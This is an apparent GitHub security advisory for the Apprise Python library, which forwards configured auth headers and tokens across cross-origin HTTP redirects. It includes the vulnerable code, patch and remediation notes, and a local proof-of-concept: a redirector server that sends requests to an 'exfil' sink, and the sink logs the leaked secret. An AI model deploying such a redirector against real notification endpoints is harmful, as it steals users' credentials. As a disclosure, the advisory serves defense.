L130: # Apprise forwards configured auth headers across cross-origin HTTP redirects
L131: 
L132: Low
L133: 
L134: cite61†caronc published GHSA-856c-92hv-3vxx Jun 29, 2026
L135: 
L136: ## Package
L137: 
L138: Apprise (cite70†pip )
L139: 
L140: ## Affected versions
L141: 
L142: <= 1.10.0
L143: 
L144: ## Patched versions
L145: 
L146: 1.11.0
L147: 
L148: ## Description
L149: # Summary
L150: Apprise's HTTP-based notification plugins and its HTTP attachment / config loaders (`apprise/attachment/http.py`, `apprise/config/http.py`) follow HTTP 3xx redirects by default and re-send the user-configured auth headers and query parameters on the redirected request.
L151: If an operator-configured destination is later compromised (service takeover, malicious update), or an attacker holds a MITM position on an unprotected network path, that destination can return a `302 Location:` to an arbitrary host and Apprise forwards the user's secret (`X-Gotify-Key`, `Authorization`, bearer tokens in query, custom `+Header=` values) to that cross-origin host.
L152: The attacker does not need to control the original Apprise URL — only the response from a destination the operator already trusts.
L153: This is the application-layer analogue of urllib3 cite71†`GHSA-34jh-p97f-mpxf` / `CVE-2026-44431` ("`Proxy-Authorization` forwarded across cross-origin redirect").
L154: # Affected versions
L155: 
L156: All releases up to and including `v1.10.0` (latest PyPI release as of filing, 2026-04-26). Fixed in v1.11.0 (released 2026-05-29), which includes cite72†PR #1610 (merged 2026-05-16, commit cite73†`68c0aef` ).
L157: # Details
L158: 
L159: `apprise/plugins/gotify.py` (pre-fix HEAD, lines 226-244, verbatim):
L160: 
L161:     headers = {
L162:         "User-Agent": self.app_id,
L163:         "Content-Type": "application/json",
L164:         "X-Gotify-Key": self.token,    # user-supplied secret
L165:     }
L166:     ...
L167:     r = requests.post(
L168:         url,
L169:         data=dumps(payload),
L170:         headers=headers,
L171:         verify=self.verify_certificate,
L172:         timeout=self.request_timeout,
L173:         # NO allow_redirects=False -- requests default is True
L174:     )
L175: `requests` follows 3xx redirects by default and re-attaches the `headers=` dict on the redirected request, regardless of origin. The same shape exists across ~50 plugins (`custom_json`, `custom_xml`, `custom_form`, `gotify`, `ntfy`, `mattermost`, `apprise_api`, and most other HTTP-based plugins), plus in `apprise/attachment/http.py` and `apprise/config/http.py`.
L176: ## Reproduction (local, safe)
L177: 
L178:     # attacker_redirector.py -- 127.0.0.1:8081 returns 302 to a cross-origin sink
L179:     import http.server
L180:     class H(http.server.BaseHTTPRequestHandler):
L181:         def do_POST(self):
L182:             self.send_response(302)
L183:             self.send_header("Location", "http://127.0.0.1:8082/exfil")
L184:             self.end_headers()
L185:     http.server.HTTPServer(("127.0.0.1", 8081), H).serve_forever()
L186: 
L187:     # attacker_sink.py -- 127.0.0.1:8082 logs the leaked headers
L188:     import http.server
L189:     class H(http.server.BaseHTTPRequestHandler):
L190:         def do_POST(self):
L191:             print("LEAKED HEADERS:", dict(self.headers))
L192:             self.send_response(204); self.end_headers()
L193:     http.server.HTTPServer(("127.0.0.1", 8082), H).serve_forever()
L194: 
L195:     # victim
L196:     from apprise import Apprise
L197:     a = Apprise()
L198:     a.add("gotify://127.0.0.1:8081?token=SECRETTOKEN")
L199:     a.notify(body="x")
L200: Observed on `master` HEAD (2026-05-13): `attacker_sink.py` prints `X-Gotify-Key: SECRETTOKEN` -- the user-supplied token followed the cross-origin redirect.
L201: # Patch
L202: 
L203: Fix landed in cite72†`caronc/apprise#1610` (merged 2026-05-16, commit `68c0aef`):
L204: 
L205:   * Adds `?redirect=yes|no` URL parameter on every plugin URL
L206:   * Adds `AppriseAsset.http_redirects` global default
L207:   * Equivalent flags wired into `apprise/attachment/http.py` and `apprise/config/http.py`
L208: The default remains `redirects=True` for backwards compatibility -- operators who relay notifications through destinations they don't fully trust should append `?redirect=no` to their Apprise URLs or set `AppriseAsset(http_redirects=False)` globally.
L209: 
L210: Released in v1.11.0 (2026-05-29, available on PyPI).
L211: 
L212: Related:
L213:   * Documentation: cite74†`caronc/apprise-docs#60` (merged 2026-05-16)
L214:   * API counterpart: cite75†`caronc/apprise-api#331` (merged 2026-05-29; shipped in apprise-api v1.5.1, built on Apprise v1.11.0)
L215: # Remediation
L216: 
L217: Upgrade to Apprise v1.11.0 or later (`pip install -U apprise`).
L218: 
L219: The default remains `redirect=yes` for backwards compatibility, so after upgrading, operators who relay notifications through destinations they don't fully trust should also set `AppriseAsset(http_redirects=False)` globally or append `?redirect=no` to each plugin URL.
L220: 
L221: If you cannot upgrade yet, operate Apprise only against fully trusted notification destinations (the maintainer-documented supported model).
L222: # Classification
L223: 
L224:   * CWE-200 Exposure of Sensitive Information to an Unauthorized Actor -- user's auth tokens / API keys / custom `+Header=` values are forwarded onto the cross-origin redirected request.
L225:   * CWE-601 URL Redirection to Untrusted Site -- a 3xx response from the initial (operator-configured) target sends the request and its credentials to a host the operator never configured.
L226: 
L227: CVSS 3.1: `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` -> 3.1 LOW.
L228: Attack requires the operator-configured destination to be compromised or an attacker to be on the network path. Impact is partial confidentiality loss: a single user-supplied secret per redirected request, scoped to that one notification channel. This is intentionally a narrow redirect/header-forwarding hardening issue, not a claim that remote destinations or remote configuration are themselves vulnerabilities.
